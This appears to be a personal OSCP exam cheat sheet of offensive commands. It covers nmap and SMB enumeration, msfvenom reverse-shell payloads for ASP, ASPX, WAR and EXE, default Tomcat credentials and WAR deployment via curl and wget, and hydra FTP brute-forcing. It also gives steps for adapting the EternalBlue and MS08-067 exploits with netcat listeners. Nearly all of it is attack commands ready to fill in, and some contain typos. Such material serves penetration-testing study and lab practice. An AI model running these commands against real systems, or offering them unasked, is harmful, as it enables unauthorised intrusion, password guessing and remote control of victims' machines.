# OSCP-Cheat-Sheet

## NMAP

### TCP 

<code>nmap -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.tcp] -p- [IP]</code>

### UDP

<code>nmap -sU -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.udp] [IP]</code>

## SMB/Samba

<code>nmap -p 139,445 -Pn -script=smb-vuln* [IP]</code>

<code>smbclient -L //[IP]/</code>

<code>enum4linux -a [IP]</code>

<code>smbmap -H [IP]</code>

<code>./smbver.sh [IP]</code> [Found Here](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)

## Werb Server

<code>dirb [URL]</code>

<code>nikto -h [URL]</code>

### ASP / ASP.NET

#### ASP Paylod: 

<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f asp > shell.asp</code>

#### ASP.NET Payload: 

<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f aspx > shell.aspx</code>

<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f asp-exe > shell.aspx</code>

### Tomcat

#### Default Credentials

<code>admin:admin</code>

<code>tomcat:tomcat</code>

<code>admin:[NOTHING]</code>

<code>admin:s3cr3t</code>

<code>tomcat:s3cr3t</code>

<code>admin:tomcat</code>

#### Payload

<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war</code>

#### Uploading to Tomcat6

<code>wget 'http://[USER]:[password]@[IP]:8080/manager/deploy?war=file:shell.war&path=/shell' -O -</code>

#### Uploading to Tomcat7 and Above

<code>curl -v -u [USER]:[PASSWORD] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>

### Local File Inclusion / Remote File Inclusion (LFI / RFI)

<code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</code>

#### LFI Lists

Linux: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>

Windows: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code>

Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>

## FTP 

### Brute Force

<code>hydra -V -f -L [USER_LIST] -P [PASSWORDS_LIST] ftp://[IP] -u -vV</code>

### Download

<code>ftp [IP]</code>

<code>>PASSIVE</code>

<code>>BINARY</code>

<code>>get [FILE]</code>

### Upload

<code>ftp [IP]</code>

<code>>PASSIVE</code>

<code>>BINARY</code>

<code>>put [FILE]</code>


## SMB Exploitation

### Eternal Blue (MS17-010) 

Use exploit found [here](https://github.com/worawit/MS17-010)

#### Payload

<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe -o shell.exe</code>

Change the <code>USERNAME = ''</code> line to <code>USERNAME = '//'</code>


Uncomment the <code>smb_send_file(...)</code> and the <code>service_exe(...)</code>

Modify them to upload and execute the payload file

Use listener 

<code>nc -lnvp [PORT]</code>

### MS08-067

Use exploit found [here](https://github.com/andyacer/ms08_067)

#### Payloads

Windows x86: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -o shell.c</code>

Windows x64: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x64 --platform windows -o shell.c</code>

Replace shell code in the script 

Execute the script

<code>python ms08_067_2018.py [IP] [OS_OPTION] [PORT]</code>

Use listener 

<code>nc -lnvp [PORT]</code>


